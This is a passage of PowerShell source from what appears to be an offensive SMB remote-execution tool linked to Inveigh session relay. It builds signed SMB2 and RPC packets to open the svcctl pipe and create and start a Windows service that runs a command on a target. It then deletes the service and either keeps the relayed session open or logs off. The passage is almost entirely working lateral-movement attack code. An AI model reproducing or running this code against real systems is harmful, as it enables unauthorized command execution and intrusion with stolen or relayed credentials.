                                $packet_SMB2_header["Signature"] = $SMB2_signature
                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            }

                            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data 
                            $stage = 'SendReceive'
                        }
                    
                        'RPCBind'
                        {
                            $stage_current = $stage
                            $SMB_named_pipe_bytes = 0x73,0x00,0x76,0x00,0x63,0x00,0x63,0x00,0x74,0x00,0x6c,0x00 # \svcctl
                            $message_ID++
                            $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        
                            if($SMB_signing)
                            {
                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                            }

                            $packet_RPC_data = New-PacketRPCBind 0x48,0x00 1 0x01 0x00,0x00 $named_pipe_UUID 0x02,0x00
                            $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                            $packet_SMB2_data = New-PacketSMB2WriteRequest $file_ID $RPC_data.Length
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
                            $RPC_data_length = $SMB2_data.Length + $RPC_data.Length
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)
                            {
                                $SMB2_sign = $SMB2_header + $SMB2_data + $RPC_data
                                $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                                $SMB2_signature = $SMB2_signature[0..15]
                                $packet_SMB2_header["Signature"] = $SMB2_signature
                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            }

                            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data
                            $stage = 'SendReceive'
                        }

                        'SendReceive'
                        {
                            $client_stream.Write($client_send,0,$client_send.Length) > $null
                            $client_stream.Flush()
                            $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                            if(Get-StatusPending $client_receive[12..15])
                            {
                                $stage = 'StatusPending'
                            }
                            else
                            {
                                $stage = 'StatusReceived'
                            }

                        }

                        'StartServiceW'
                        {
                        
                            if([System.BitConverter]::ToString($client_receive[132..135]) -eq '00-00-00-00')
                            {
                                Write-Verbose "Service $SMB_service created on $Target"
                                $SMB_service_context_handle = $client_receive[112..131]
                                $stage_current = $stage
                                $message_ID++
                                $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                            
                                if($SMB_signing)
                                {
                                    $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                                }

                                $packet_SCM_data = New-PacketSCMStartServiceW $SMB_service_context_handle
                                $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                                $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x13,0x00
                                $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                                $packet_SMB2_data = New-PacketSMB2WriteRequest $file_ID ($RPC_data.Length + $SCM_data.Length)
                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                                $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data   
                                $RPC_data_length = $SMB2_data.Length + $SCM_data.Length + $RPC_data.Length
                                $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                                $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                                if($SMB_signing)
                                {
                                    $SMB2_sign = $SMB2_header + $SMB2_data + $RPC_data + $SCM_data
                                    $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                                    $SMB2_signature = $SMB2_signature[0..15]
                                    $packet_SMB2_header["Signature"] = $SMB2_signature
                                    $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                                }

                                $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data + $SCM_data
                                Write-Verbose "[*] Trying to execute command on $Target"
                                $stage = 'SendReceive'
                            }
                            elseif([System.BitConverter]::ToString($client_receive[132..135]) -eq '31-04-00-00')
                            {
                                Write-Output "[-] Service $SMB_service creation failed on $Target"
                                $stage = 'Exit'
                            }
                            else
                            {
                                Write-Output "[-] Service creation fault context mismatch"
                                $stage = 'Exit'
                            }
    
                        }
                
                        'StatusPending'
                        {
                            $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                            
                            if([System.BitConverter]::ToString($client_receive[12..15]) -ne '03-01-00-00')
                            {
                                $stage = 'StatusReceived'
                            }

                        }

                        'StatusReceived'
                        {

                            switch ($stage_current)
                            {

                                'CloseRequest'
                                {
                                    $stage = 'TreeDisconnect'
                                }

                                'CloseServiceHandle'
                                {

                                    if($SMB_close_service_handle_stage -eq 2)
                                    {
                                        $stage = 'CloseServiceHandle'
                                    }
                                    else
                                    {
                                        $stage = 'CloseRequest'
                                    }

                                }

                                'CreateRequest'
                                {
                                    $file_ID = $client_receive[132..147]

                                    if($Refresh -and $stage -ne 'Exit')
                                    {
                                        Write-Output "[+] Session refreshed"
                                        $stage = 'Exit'
                                    }
                                    elseif($stage -ne 'Exit')
                                    {
                                        $stage = 'RPCBind'
                                    }

                                }

                                'CreateServiceW'
                                {
                                    $stage = 'ReadRequest'
                                    $stage_next = 'StartServiceW'
                                }

                                'CreateServiceW_First'
                                {

                                    if($SMB_split_stage_final -le 2)
                                    {
                                        $stage = 'CreateServiceW_Last'
                                    }
                                    else
                                    {
                                        $SMB_split_stage = 2
                                        $stage = 'CreateServiceW_Middle'
                                    }
                                    
                                }

                                'CreateServiceW_Middle'
                                {

                                    if($SMB_split_stage -ge $SMB_split_stage_final)
                                    {
                                        $stage = 'CreateServiceW_Last'
                                    }
                                    else
                                    {
                                        $stage = 'CreateServiceW_Middle'
                                    }

                                }

                                'CreateServiceW_Last'
                                {
                                    $stage = 'ReadRequest'
                                    $stage_next = 'StartServiceW'
                                }

                                'DeleteServiceW'
                                {
                                    $stage = 'ReadRequest'
                                    $stage_next = 'CloseServiceHandle'
                                    $SMB_close_service_handle_stage = 1
                                }

                                'Logoff'
                                {
                                    $stage = 'Exit'
                                }

                                'OpenSCManagerW'
                                {
                                    $stage = 'ReadRequest'
                                    $stage_next = 'CheckAccess' 
                                }

                                'ReadRequest'
                                {
                                    $stage = $stage_next
                                }

                                'RPCBind'
                                {
                                    $stage = 'ReadRequest'
                                    $stage_next = 'OpenSCManagerW'
                                }

                                'StartServiceW'
                                {
                                    $stage = 'ReadRequest'
                                    $stage_next = 'DeleteServiceW'  
                                }

                                'TreeConnect'
                                {
                                    $tree_ID = $client_receive[40..43]
                                    $stage = 'CreateRequest'
                                }

                                'TreeDisconnect'
                                {

                                    if($inveigh_session -and !$Logoff)
                                    {
                                        $stage = 'Exit'
                                    }
                                    else
                                    {
                                        $stage = 'Logoff'
                                    }

                                }

                            }

                        }
                    
                        'TreeConnect'
                        {
                            $tree_ID = $client_receive[40..43]
                            $message_ID++
                            $stage_current = $stage
                            $packet_SMB2_header = New-PacketSMB2Header 0x03,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID

                            if($SMB_signing)
                            {
                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                            }

                            $packet_SMB2_data = New-PacketSMB2TreeConnectRequest $SMB_path_bytes
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data    
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)
                            {
                                $SMB2_sign = $SMB2_header + $SMB2_data 
                                $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                                $SMB2_signature = $SMB2_signature[0..15]
                                $packet_SMB2_header["Signature"] = $SMB2_signature
                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            }

                            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data

                            try
                            {
                                $client_stream.Write($client_send,0,$client_send.Length) > $null
                                $client_stream.Flush()
                                $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                                if(Get-StatusPending $client_receive[12..15])
                                {
                                    $stage = 'StatusPending'
                                }
                                else
                                {
                                    $stage = 'StatusReceived'
                                }
                            }
                            catch
                            {
                                Write-Output "[-] Session connection is closed"
                                $stage = 'Exit'
                            }
                            
                        }

                        'TreeDisconnect'
                        {
                            $stage_current = $stage
                            $message_ID++
                            $packet_SMB2_header = New-PacketSMB2Header 0x04,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        
                            if($SMB_signing)
                            {
                                $packet_SMB2_header["Flags"] = 0x08,0x00,0x00,0x00      
                            }
            
                            $packet_SMB2_data = New-PacketSMB2TreeDisconnectRequest
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)
                            {
                                $SMB2_sign = $SMB2_header + $SMB2_data
                                $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                                $SMB2_signature = $SMB2_signature[0..15]
                                $packet_SMB2_header["Signature"] = $SMB2_signature
                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            }

                            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                            $stage = 'SendReceive'
                        }
    
                    }
                
                }

            }
            catch
            {
                Write-Output "[-] $($_.Exception.Message)"
            }
        
        }

    }

    if($inveigh_session -and $Inveigh)
    {
        $inveigh.session_lock_table[$session] = 'open'
        $inveigh.session_message_ID_table[$session] = $message_ID
        $inveigh.session[$session] | Where-Object {$_."Last Activity" = Get-Date -format s}
    }

    if(!$inveigh_session -or $Logoff)
    {
        $client.Close()
        $client_stream.Close()
    }

}

}





